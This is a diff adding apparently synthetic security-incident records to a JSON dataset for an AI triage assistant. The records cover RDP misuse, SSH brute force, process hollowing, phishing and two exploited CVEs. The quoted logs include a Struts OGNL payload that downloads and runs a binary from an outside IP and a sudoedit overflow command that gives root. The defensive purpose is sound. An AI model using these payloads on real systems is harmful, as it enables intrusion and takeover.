+      {"step": 2, "priority": "Medium", "action": "Inspect scrcons.exe process memory dump", "reason": "Determine what script was executed during recent boot", "evidence": "Volatility memory analysis", "expected_result": "Script attempted connection to internal subnet"}
+    ],
+    "root_cause": "Adversary gained administrative access through unpatched SQL server vulnerability and created stealth WMI event subscription for persistent survival.",
+    "remediation": "WMI persistence purged, SQL server patched and firewalled, database service account rights downgraded.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Exact PowerShell CIM syntax for WMI removal provided by Hindsight saved time.",
+      "analyst_id": "analyst_sec_02"
+    },
+    "lessons_learned": "Regularly audit root\\subscription WMI namespaces across critical database infrastructure."
+  },
+  {
+    "id": "INC-2026-0815",
+    "timestamp": "2026-11-05T10:45:11Z",
+    "title": "Interactive Logon by Service Account 'svc-sql-cluster' Outside Business Hours",
+    "alert_type": "Unusual account activity",
+    "severity": "High",
+    "affected_host": "SQL-NODE-ACTIVE",
+    "user": "svc-sql-cluster",
+    "description": "Windows Security Event 4624 (Logon Type 10 - RemoteInteractive / RDP) recorded for service account that should strictly authenticate via Logon Type 5 (Service).",
+    "raw_logs": "EventID: 4624\nLogonType: 10 (RemoteInteractive)\nTargetUserName: svc-sql-cluster\nSourceNetworkAddress: 192.168.100.24\nTime: 02:44:11 AM (Sunday)\nProcessName: C:\\Windows\\System32\\svchost.exe",
+    "indicators": {
+      "ips": ["192.168.100.24"],
+      "domains": [],
+      "hashes": [],
+      "processes": ["mstsc.exe", "rdpclip.exe"],
+      "mitre_techniques": ["T1078.002", "T1021.001"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Disconnect and lock active RDP session", "reason": "Interrupt unauthorized remote desktop session", "evidence": "qwinsta & logoff session ID", "expected_result": "RDP session aborted"},
+      {"step": 2, "priority": "High", "action": "Investigate source IP 192.168.100.24", "reason": "Identify which workstation on the management network was used as pivot", "evidence": "DHCP / ARP table lookup", "expected_result": "Traced to compromised IT Helpdesk laptop"}
+    ],
+    "root_cause": "Helpdesk engineer machine compromised via infostealer malware, harvesting plaintext password of sql service account from KeePass export.",
+    "remediation": "Service account password rotated, 'Deny logon through Remote Desktop Services' user right assignment applied to all service accounts.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Fast identification of Logon Type 10 violation.",
+      "analyst_id": "analyst_sec_04"
+    },
+    "lessons_learned": "Enforce Group Policy denying interactive and RDP logon privileges to all non-human service accounts."
+  },
+  {
+    "id": "INC-2026-0816",
+    "timestamp": "2026-11-05T12:30:50Z",
+    "title": "Brute-Force SSH Attempts Against DMZ Bastion Host",
+    "alert_type": "Brute-force login attempts",
+    "severity": "Low",
+    "affected_host": "BASTION-EXT-01",
+    "user": "root, admin, test, ubuntu",
+    "description": "Auth.log reported 5,200 failed public key and password attempts from Chinese hosting IP within 30 minutes. All rejected by PAM.",
+    "raw_logs": "Nov 5 12:28:10 bastion sshd[22910]: Failed password for invalid user admin from 112.85.42.19 port 48102 ssh2\nNov 5 12:28:12 bastion sshd[22915]: Failed password for root from 112.85.42.19 port 48104 ssh2\nNov 5 12:28:14 bastion sshd[22920]: Connection closed by authenticating user 112.85.42.19 [preauth]",
+    "indicators": {
+      "ips": ["112.85.42.19"],
+      "domains": [],
+      "hashes": [],
+      "processes": ["sshd"],
+      "mitre_techniques": ["T1110.001"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "Low", "action": "Verify Fail2ban status on BASTION-EXT-01", "reason": "Ensure automated jail banned the attacking IP", "evidence": "fail2ban-client status sshd", "expected_result": "IP 112.85.42.19 banned for 24 hours"},
+      {"step": 2, "priority": "Low", "action": "Confirm SSH key-only authentication is enforced", "reason": "Ensure password authentication is disabled in sshd_config", "evidence": "PasswordAuthentication no verified", "expected_result": "No passwords accepted"}
+    ],
+    "root_cause": "Internet background noise / automated botnet scanning public IPv4 addresses for default credentials.",
+    "remediation": "Fail2ban automatically banned IP, verified bastion allows only hardware-backed SSH keys and requires VPN tunnel.",
+    "final_outcome": "False Positive",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Automated triaging identified this as low-priority noise, saving SOC analyst time.",
+      "analyst_id": "analyst_sec_08"
+    },
+    "lessons_learned": "Move public bastion SSH port behind WireGuard VPN to eliminate internet-wide scanning noise."
+  },
+  {
+    "id": "INC-2026-0817",
+    "timestamp": "2026-11-05T14:18:00Z",
+    "title": "Suspicious PowerShell In-Memory Injection via Process Hollowing",
+    "alert_type": "Suspicious PowerShell execution",
+    "severity": "Critical",
+    "affected_host": "DEV-WKS-77",
+    "user": "corp\\rdeveloper",
+    "description": "EDR flagged powershell.exe invoking VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread targeting svchost.exe.",
+    "raw_logs": "Alert: Process Injection (T1055.012)\nSource: powershell.exe (PID: 6712)\nTarget: C:\\Windows\\System32\\svchost.exe (PID: 1044)\nAPI Calls: OpenProcess(PROCESS_ALL_ACCESS) -> VirtualAllocEx(PAGE_EXECUTE_READWRITE) -> WriteProcessMemory -> CreateRemoteThread\nEntropy: 7.21 (Shellcode pattern)",
+    "indicators": {
+      "ips": ["193.142.59.88"],
+      "domains": ["raw.githubusercontent-verify.com"],
+      "hashes": ["887766554433221100ffeeddccbbaa99887766554433221100ffeeddccbbaa99"],
+      "processes": ["powershell.exe", "svchost.exe"],
+      "mitre_techniques": ["T1055.012", "T1059.001"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "Critical", "action": "Instantly kill hollowed svchost.exe (PID 1044) and parent powershell.exe", "reason": "Terminate injected payload execution thread", "evidence": "Process termination command", "expected_result": "Processes terminated"},
+      {"step": 2, "priority": "High", "action": "Dump shellcode buffer from memory before shutdown", "reason": "Extract payload configuration and C2 address", "evidence": "Process hacker minidump", "expected_result": "Cobalt Strike beacon config extracted"}
+    ],
+    "root_cause": "Developer downloaded unauthorized cracked software tool containing embedded Cobalt Strike loader.",
+    "remediation": "Endpoint wiped and re-imaged, developer security coaching session scheduled, local administrative rights revoked.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Process hollowing signature matched memory bank rule accurately.",
+      "analyst_id": "analyst_sec_01"
+    },
+    "lessons_learned": "Remove local administrator privileges from developer workstations and enforce Windows Defender Application Control."
+  },
+  {
+    "id": "INC-2026-0818",
+    "timestamp": "2026-11-05T16:02:18Z",
+    "title": "Apache Struts Remote Code Execution Attempt on Legacy Internal Server",
+    "alert_type": "Web server compromise",
+    "severity": "Critical",
+    "affected_host": "INTERNAL-LEGACY-APP",
+    "user": "tomcat",
+    "description": "Network IPS detected HTTP Content-Type header containing OGNL expression payload attempting command execution (CVE-2017-5638).",
+    "raw_logs": "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...(#cmd='/usr/bin/wget http://91.240.118.5/bot -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot')...}\nMethod: POST /orders.action\nSrcIP: 91.240.118.5",
+    "indicators": {
+      "ips": ["91.240.118.5"],
+      "domains": [],
+      "hashes": ["11223344556677889900aabbccddeeff11223344556677889900aabbccddeeff"],
+      "processes": ["java", "wget", "bot"],
+      "mitre_techniques": ["T1190", "T1059.004"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "Critical", "action": "Take legacy app server offline from internal VLAN", "reason": "Prevent worm-like spread across internal subnets", "evidence": "Switchport disable", "expected_result": "Host isolated"},
+      {"step": 2, "priority": "High", "action": "Inspect /tmp directory for downloaded 'bot' binary", "reason": "Check if wget command succeeded", "evidence": "ls -la /tmp", "expected_result": "File /tmp/bot found and deleted"}
+    ],
+    "root_cause": "Vulnerable Apache Struts version unpatched since 2018 on forgotten internal legacy ordering system.",
+    "remediation": "Decommissioned legacy VM permanently; ordering functionality was already migrated to modern cloud portal.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Memory retrieval flagged this obsolete server as a decommission candidate from last quarter's audit.",
+      "analyst_id": "analyst_sec_02"
+    },
+    "lessons_learned": "Enforce strict asset lifecycle management and automatically decommission unmaintained internal legacy servers."
+  },
+  {
+    "id": "INC-2026-0819",
+    "timestamp": "2026-11-05T17:45:00Z",
+    "title": "Privilege Escalation via Sudo CVE-2021-3156 (Baron Samedit) on Linux Build Server",
+    "alert_type": "Privilege escalation indicators",
+    "severity": "High",
+    "affected_host": "CI-BUILD-NODE-04",
+    "user": "jenkins",
+    "description": "Host IDS detected heap-based buffer overflow in sudoedit command line parsing invoked by jenkins CI user to gain root shell.",
+    "raw_logs": "Command: sudoedit -s '\\' `perl -e 'print \"A\" x 65536'`\nUID: 1002 (jenkins)\nEUID: 0 (root)\nSyscall: execve('/bin/sh')\nAuditd Event: type=EXECVE a0=\"sudoedit\" a1=\"-s\" a2=\"\\\\\"...",
+    "indicators": {
+      "ips": [],
+      "domains": [],
+      "hashes": [],
+      "processes": ["sudoedit", "perl", "sh"],
+      "mitre_techniques": ["T1068", "T1548.003"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Kill unauthorized root shell spawned under jenkins UID", "reason": "Stop interactive privileged access", "evidence": "pkill -P <jenkins_pid>", "expected_result": "Root shell killed"},
+      {"step": 2, "priority": "High", "action": "Update sudo package to version >= 1.9.5p2", "reason": "Patch Baron Samedit vulnerability", "evidence": "apt-get install --only-upgrade sudo", "expected_result": "Sudo patched to secure release"}
+    ],
+    "root_cause": "Outdated sudo binary on legacy CI agent container allowed unprivileged Jenkins build job to gain root access.",
+    "remediation": "Upgraded sudo across all CI build nodes, hardened container execution with unprivileged Docker flags and user namespaces.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Exact CVE identification and mitigation steps provided instantly.",
+      "analyst_id": "analyst_sec_03"
+    },
+    "lessons_learned": "Automate container base image updates and scanning in CI/CD pipelines before deployment to build clusters."
+  },
+  {
+    "id": "INC-2026-0820",
+    "timestamp": "2026-11-05T19:30:10Z",
+    "title": "Phishing Email Delivering OneNote Document with Embedded WSH Script",
+    "alert_type": "Phishing and malicious attachments",
+    "severity": "Medium",
+    "affected_host": "MKT-LAPTOP-08",
+    "user": "corp\\jmartinez",
+    "description": "User opened attachment invoice_payment.one which revealed hidden 'Open' button overlaying an embedded WSF script that executed via wscript.exe.",
+    "raw_logs": "Process: wscript.exe C:\\Users\\jmartinez\\AppData\\Local\\Temp\\OneNote\\16.0\\Exported\\payment.wsf\nParent: ONENOTE.EXE (PID: 5120)\nNetwork: Connection to 103.145.13.91:443",
+    "indicators": {
+      "ips": ["103.145.13.91"],
+      "domains": ["invoice-portal-cdn.net"],
+      "hashes": ["778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566"],
+      "processes": ["ONENOTE.EXE", "wscript.exe"],
+      "mitre_techniques": ["T1566.001", "T1204.002", "T1059.005"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Terminate wscript.exe process on MKT-LAPTOP-08", "reason": "Abort malicious script execution", "evidence": "Stop-Process -Name wscript", "expected_result": "Process terminated"},
+      {"step": 2, "priority": "High", "action": "Block 103.145.13.91 on edge firewall", "reason": "Sever outbound C2 download attempt", "evidence": "Palo Alto firewall block rule", "expected_result": "Egress connection dropped"},
+      {"step": 3, "priority": "Medium", "action": "Implement Microsoft GPO blocking execution of embedded files in OneNote", "reason": "Prevent recurrence of OneNote weaponization", "evidence": "OneNote security GPO", "expected_result": "OneNote blocks embedded attachments"}
+    ],
+    "root_cause": "OneNote weaponized attachment clicked by marketing specialist expecting a supplier invoice.",
+    "remediation": "Script killed, outbound IP blocked, host scanned with EDR, GPO deployed blocking dangerous file extensions in OneNote.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The Hindsight recall referenced our prior Q2 OneNote campaign, providing the exact GPO regkey to disable embedded attachments.",
+      "analyst_id": "analyst_sec_01"
+    },
+    "lessons_learned": "Deploy Microsoft 365 Group Policy to disallow embedded script execution in OneNote notebooks across all corporate devices."
+  }
+]
+
